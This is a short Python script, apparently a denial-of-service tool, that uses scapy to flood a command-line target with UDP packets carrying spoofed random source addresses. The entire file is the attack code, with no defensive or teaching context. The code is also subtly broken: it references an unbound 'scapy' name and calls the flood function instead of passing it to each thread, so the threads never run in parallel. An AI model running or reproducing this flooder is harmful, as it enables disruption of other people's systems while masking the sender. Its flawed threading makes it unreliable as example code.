import sys
from scapy.layers.http import *
from scapy.all import *


target = str(sys.argv[1])

print("Starting UDP flood attack towards " + target + " ...")


def udp_flood():
    try:
        packet = scapy.IP(src=str(RandIP()), dst=target) / \
            scapy.UDP(dport=RandShort()) / ("X" * RandByte())
        send(packet, verbose=0, loop=1, inter=0.001)
    except KeyboardInterrupt as e:
        sys.exit(1)


t1 = threading.Thread(target=udp_flood())
t2 = threading.Thread(target=udp_flood())
t3 = threading.Thread(target=udp_flood())
t4 = threading.Thread(target=udp_flood())

t1.start()
t2.start()
t3.start()
t4.start()
